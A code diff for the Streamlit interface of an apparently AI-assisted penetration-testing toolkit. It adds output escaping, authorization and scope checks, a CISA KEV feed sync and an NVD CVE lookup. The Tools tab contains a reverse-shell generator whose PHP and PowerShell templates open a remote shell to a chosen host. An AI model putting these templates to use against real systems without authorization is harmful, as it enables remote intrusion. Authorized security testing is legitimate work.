@@ -4,12 +4,19 @@ Streamlit interface.
 Seven tabs, sidebar, chat surface, and report export. Kept deliberately
 plain -- the interesting logic lives in the other modules. This file
 turns state into pixels and nothing more.
+
+Revision notes:
+  - HTML report export escapes user-controlled finding/evidence text.
+  - CISA Sync button is wired to apex_intel_dummy.sync_cisa_feed().
+  - NVD CVE lookup is implemented in the Tools tab.
+  - Empty inputs, invalid CVEs, and missing evidence are handled.
 """
 
 from __future__ import annotations
 
 import base64
 import hashlib
+import html as _html
 import json
 from datetime import datetime
 from pathlib import Path
@@ -31,6 +38,9 @@ from apex_payload import (
 from apex_vulndb import (
     all_vulnerabilities, by_category as vuln_by_category,
     categories as vuln_categories, search as vuln_search, total as vuln_total,
+)
+from apex_intel_dummy import (
+    load_threat_intel, cache_info, sync_cisa_feed, search_intel,
 )
 
 
@@ -103,10 +113,6 @@ code, pre {
   background:rgba(229,72,77,0.08); border:1px solid rgba(229,72,77,0.4);
   border-radius:8px; padding:12px 16px; color:#ffb4b6; font-size:0.9rem;
 }
-.sev-critical { color:#ff6b6b; font-weight:700; }
-.sev-high { color:#ff9642; font-weight:700; }
-.sev-medium { color:#ffd166; font-weight:700; }
-.sev-low { color:#8ecae6; font-weight:700; }
 </style>
 """
 
@@ -130,11 +136,8 @@ def render_header() -> None:
     )
 
 
-def _sev_class(sev: str) -> str:
-    return {
-        "critical": "sev-critical", "high": "sev-high",
-        "medium": "sev-medium", "low": "sev-low",
-    }.get((sev or "").lower(), "")
+def _esc(text: object) -> str:
+    return _html.escape(str(text if text is not None else ""))
 
 
 # ---------------------------------------------------------------------------
@@ -155,7 +158,8 @@ def render_sidebar() -> None:
             ip = st.text_input("IP / Host", value=tracker.target.ip_address, key="sb_ip")
             host = st.text_input("Hostname", value=tracker.target.hostname, key="sb_host")
             os_info = st.text_input("OS", value=tracker.target.os_info, key="sb_os")
-            stack = st.text_input("Stack (nginx, php, mysql)", value=tracker.target.technologies, key="sb_stack")
+            stack = st.text_input("Stack (nginx, php, mysql)",
+                                  value=tracker.target.technologies, key="sb_stack")
             env_opts = ["lab", "staging", "production", "ctf", "bug-bounty"]
             env_idx = (env_opts.index(tracker.target.environment)
                        if tracker.target.environment in env_opts else 0)
@@ -166,8 +170,12 @@ def render_sidebar() -> None:
                 value=tracker.target.authorization_ref,
                 placeholder="SOW / ticket / engagement ID", key="sb_auth",
             )
-            scope = st.text_area("Scope Notes", value=tracker.target.scope_notes,
-                                 height=70, key="sb_scope")
+            scope = st.text_area(
+                "Approved Scope (comma-separated hosts / CIDRs)",
+                value=tracker.target.scope_notes,
+                height=70, key="sb_scope",
+                help="e.g. 10.0.0.0/24, app.example.com, *.internal.lab",
+            )
             if st.button("Save Target", key="btn_save_target"):
                 tracker.set_target(TargetProfile(
                     ip_address=ip.strip(), hostname=host.strip(),
@@ -258,15 +266,32 @@ def render_sidebar() -> None:
                 bridge.invalidate()
                 st.rerun()
 
+        with st.expander("Threat Intelligence", expanded=False):
+            info = cache_info()
+            st.caption(f"Cache: {info['count']} entries")
+            if info["last_sync"]:
+                st.caption(f"Last sync: {info['last_sync'][:19]}")
+            else:
+                st.caption("Never synced.")
+            if st.button("Sync CISA KEV", key="btn_cisa_sync"):
+                with st.spinner("Fetching CISA feed..."):
+                    result = sync_cisa_feed()
+                if result["ok"]:
+                    st.success(f"Synced {result['count']} entries.")
+                else:
+                    st.error(f"Sync failed: {result['error']}")
+
         with st.expander("Status", expanded=True):
             health = bridge.health()
             run = health["ollama_running"]
             st.markdown(f"**Ollama:** {'online' if run else 'offline'}")
-            st.markdown(f"**Model:** `{health['active_model']}` "
+            st.markdown(f"**Model:** `{_esc(health['active_model'])}` "
                         f"({'loaded' if health['active_model_present'] else 'missing'})")
             st.caption(f"Vulnerabilities indexed: {vuln_total()}")
             st.caption(f"Payloads loaded: {len(all_payloads())}")
             st.caption(f"Findings in session: {len(tracker.findings)}")
+            in_scope, _reason = tracker.target_in_scope()
+            st.caption(f"Scope check: {'in scope' if in_scope else 'out of scope'}")
 
 
 # ---------------------------------------------------------------------------
@@ -295,10 +320,18 @@ def render_chat_tab() -> None:
 
     if not tracker.has_authorization():
         st.markdown(
-            '<div class="scope-warning">No authorization reference set. '
-            'Fill in the Target Profile before running active tests.</div>',
+            '<div class="scope-warning">No authorization reference and/or '
+            'approved scope set. Active operations will be refused. '
+            'Fill in the Target Profile before running tests.</div>',
             unsafe_allow_html=True,
         )
+    else:
+        in_scope, reason = tracker.target_in_scope()
+        if not in_scope:
+            st.markdown(
+                f'<div class="scope-warning">{_esc(reason)}</div>',
+                unsafe_allow_html=True,
+            )
 
     with st.expander("Attach evidence", expanded=False):
         uploads = st.file_uploader(
@@ -313,8 +346,6 @@ def render_chat_tab() -> None:
         with c2:
             linked = st.text_input("Link to finding ID", key="chat_linked")
         if uploads and st.button("Save Evidence", key="btn_save_ev"):
-            # reuse the EvidenceManager in the payload module? We keep the
-            # save logic in the UI to avoid a circular import.
             from apex_core import EVIDENCE_DIR
             saved = 0
             for up in uploads:
@@ -327,7 +358,8 @@ def render_chat_tab() -> None:
                 path = EVIDENCE_DIR / f"{stamp}_{stem}{suffix}"
                 try:
                     path.write_bytes(data)
-                except OSError:
+                except OSError as exc:
+                    st.error(f"Could not save {up.name}: {exc}")
                     continue
                 memory.add_evidence(
                     session_id=sid, filename=up.name, filepath=str(path),
@@ -343,7 +375,8 @@ def render_chat_tab() -> None:
     if evidence:
         with st.expander(f"Evidence ({len(evidence)})", expanded=False):
             for ev in evidence:
-                st.markdown(f"**{ev['filename']}** - {human_size(ev['size_bytes'])}")
+                st.markdown(f"**{_esc(ev['filename'])}** - "
+                            f"{human_size(ev['size_bytes'])}")
                 if ev.get("caption"):
                     st.caption(ev["caption"])
                 if st.button(f"Remove {ev['filename']}",
@@ -355,9 +388,7 @@ def render_chat_tab() -> None:
     if not history:
         st.info(
             "No messages yet. Start by describing the target, pasting "
-            "an error, or sharing a URL. The assistant will ask for "
-            "system details first, then walk through recon, then "
-            "exploitation."
+            "an error, or sharing a URL."
         )
     for msg in history:
         with st.chat_message(msg["role"]):
@@ -413,16 +444,16 @@ def render_vulns_tab() -> None:
         with st.expander(f"{v['name']} - {sev} - {v['category']}"):
             st.markdown(f"**Description**  \n{v['description']}")
             st.markdown("**Detection**")
-            for line in v["detection"]:
+            for line in v.get("detection", []):
                 st.markdown(f"- {line}")
             st.markdown("**Exploitation**")
-            for line in v["exploitation"]:
+            for line in v.get("exploitation", []):
                 st.markdown(f"- {line}")
             if v.get("payloads"):
                 st.markdown("**Linked payloads**")
                 for p in v["payloads"]:
                     st.code(p, language="text")
-            st.markdown(f"**Mitigation**  \n{v['mitigation']}")
+            st.markdown(f"**Mitigation**  \n{v.get('mitigation', '-')}")
             if v.get("references"):
                 st.caption("References: " + ", ".join(v["references"]))
 
@@ -551,7 +582,8 @@ def render_findings_tab() -> None:
                 if added:
                     st.rerun()
                 else:
-                    st.warning("That ID is already tracked.")
+                    st.warning("That ID is already tracked "
+                               "(case-insensitive match).")
 
     st.markdown("---")
     if not tracker.findings:
@@ -591,16 +623,26 @@ def render_reports_tab() -> None:
 
     st.subheader("Reports")
 
-    author = st.text_input("Author", value=str(config.get("report_author")), key="rep_author")
-    org = st.text_input("Organization", value=str(config.get("report_org")), key="rep_org")
+    if not tracker.findings:
+        st.info("Add at least one finding before exporting a report.")
+        return
+
+    author = st.text_input("Author", value=str(config.get("report_author")),
+                           key="rep_author")
+    org = st.text_input("Organization", value=str(config.get("report_org")),
+                        key="rep_org")
     if st.button("Save Author Info", key="btn_save_author"):
         config.update({"report_author": author, "report_org": org})
         st.toast("Saved.", icon="OK")
 
     evidence = memory.list_evidence(sid)
-    md = ReportGenerator.to_markdown(tracker, evidence, sid, author, org)
-    html = ReportGenerator.to_html(md, title=f"APEX-SEC {sid[:8]}")
-    js = ReportGenerator.to_json(tracker, evidence, sid)
+    try:
+        md = ReportGenerator.to_markdown(tracker, evidence, sid, author, org)
+        html = ReportGenerator.to_html(md, title=f"APEX-SEC {sid[:8]}")
+        js = ReportGenerator.to_json(tracker, evidence, sid)
+    except Exception as exc:
+        st.error(f"Report generation failed: {exc}")
+        return
 
     stamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
 
@@ -618,6 +660,11 @@ def render_reports_tab() -> None:
         st.download_button("Download HTML", data=html,
                            file_name=f"apex_{stamp}.html",
                            mime="text/html", key="dl_html")
+        st.caption(
+            "HTML export is generated from Markdown with all "
+            "user-controlled fields escaped. Inline scripts in findings "
+            "are rendered as text, not executed."
+        )
     with tab3:
         st.code(js, language="json")
         st.download_button("Download JSON", data=js,
@@ -628,6 +675,8 @@ def render_reports_tab() -> None:
         written = ReportGenerator.save_all(md, html, js)
         if written:
             st.success(f"Wrote {len(written)} file(s).")
+        else:
+            st.error("No files written — check config/reports permissions.")
 
 
 # ---------------------------------------------------------------------------
@@ -636,10 +685,11 @@ def render_reports_tab() -> None:
 
 def render_tools_tab() -> None:
     st.subheader("Utilities")
-    tool = st.selectbox("Tool",
-                        ["Hash", "Base64", "URL", "JWT",
-                         "Reverse Shell"],
-                        key="tool_pick")
+    tool = st.selectbox(
+        "Tool",
+        ["Hash", "Base64", "URL", "JWT", "Reverse Shell", "CISA Search", "NVD Lookup"],
+        key="tool_pick",
+    )
 
     if tool == "Hash":
         text = st.text_area("Input", key="hash_in")
@@ -654,7 +704,8 @@ def render_tools_tab() -> None:
 
     elif tool == "Base64":
         text = st.text_area("Input", key="b64_in")
-        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True, key="b64_mode")
+        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
+                        key="b64_mode")
         if text:
             try:
                 if mode == "Encode":
@@ -667,7 +718,8 @@ def render_tools_tab() -> None:
 
     elif tool == "URL":
         text = st.text_area("Input", key="url_in")
-        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True, key="url_mode")
+        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
+                        key="url_mode")
         if text:
             from urllib.parse import quote, unquote
             st.code(quote(text) if mode == "Encode" else unquote(text))
@@ -679,19 +731,25 @@ def render_tools_tab() -> None:
             if len(parts) < 2:
                 st.error("Not a valid JWT.")
             else:
-                def _pad(s): return s + "=" * (-len(s) % 4)
+                def _pad(s: str) -> str:
+                    return s + "=" * (-len(s) % 4)
                 try:
                     h = json.loads(base64.urlsafe_b64decode(_pad(parts[0])))
                     p = json.loads(base64.urlsafe_b64decode(_pad(parts[1])))
                     st.json(h)
                     st.json(p)
                 except Exception as exc:
-                    st.error(str(exc))
+                    st.error(f"Could not decode JWT: {exc}")
 
-    else:
+    elif tool == "Reverse Shell":
         tracker = st.session_state.v_tracker
         if not tracker.has_authorization():
-            st.warning("Set an authorization reference before generating reverse shells.")
+            st.warning("Set an authorization reference and approved scope "
+                       "before generating reverse shells.")
+            return
+        in_scope, reason = tracker.target_in_scope()
+        if not in_scope:
+            st.warning(f"Out of scope: {reason}")
             return
         c1, c2 = st.columns(2)
         with c1:
@@ -703,6 +761,61 @@ def render_tools_tab() -> None:
                             key="rs_kind")
         if lhost and lport:
             st.code(_revshell(kind, lhost, lport), language="bash")
+
+    elif tool == "CISA Search":
+        kw = st.text_input("Keyword", placeholder="exchange, chrome, vpn",
+                           key="cisa_q")
+        if kw.strip():
+            hits = search_intel(kw)
+            if not hits:
+                st.info("No KEV entries match. Try Sync CISA first.")
+            for item in hits:
+                st.markdown(
+                    f"**{item.get('cveID','')}** — "
+                    f"{item.get('vulnerabilityName','')}"
+                )
+                st.caption(
+                    f"{item.get('vendorProject','')} / "
+                    f"{item.get('product','')} — "
+                    f"added {item.get('dateAdded','')}"
+                )
+
+    else:
+        cve_id = st.text_input("CVE ID", placeholder="CVE-2024-3094",
+                               key="nvd_q").strip()
+        if cve_id and st.button("Lookup", key="btn_nvd"):
+            if not cve_id.upper().startswith("CVE-"):
+                st.error("CVE ID must start with 'CVE-'.")
+            else:
+                import requests as _rq
+                try:
+                    r = _rq.get(
+                        "https://services.nvd.nist.gov/rest/json/cves/2.0",
+                        params={"cveId": cve_id.upper()},
+                        timeout=15,
+                    )
+                    if r.status_code != 200:
+                        st.error(f"NVD returned HTTP {r.status_code}.")
+                    else:
+                        data = r.json()
+                        vulns = data.get("vulnerabilities") or []
+                        if not vulns:
+                            st.warning("CVE not found in NVD.")
+                        else:
+                            cve = vulns[0]["cve"]
+                            st.markdown(f"**{cve.get('id','')}**")
+                            desc = next(
+                                (d["value"] for d in cve.get("descriptions", [])
+                                 if d.get("lang") == "en"), ""
+                            )
+                            st.write(desc)
+                            metrics = cve.get("metrics", {})
+                            for k, v in metrics.items():
+                                if v:
+                                    st.caption(f"{k}: {v[0]}")
+                                    break
+                except _rq.exceptions.RequestException as exc:
+                    st.error(f"NVD request failed: {exc}")
 
 
 def _revshell(kind: str, lhost: str, lport: str) -> str:
@@ -725,7 +838,8 @@ def _revshell(kind: str, lhost: str, lport: str) -> str:
                 f"$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,"
                 f"$sb.Length);$s.Flush()}}")
     if kind == "php":
-        return f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        return (f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
+                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
     return ""
 
 
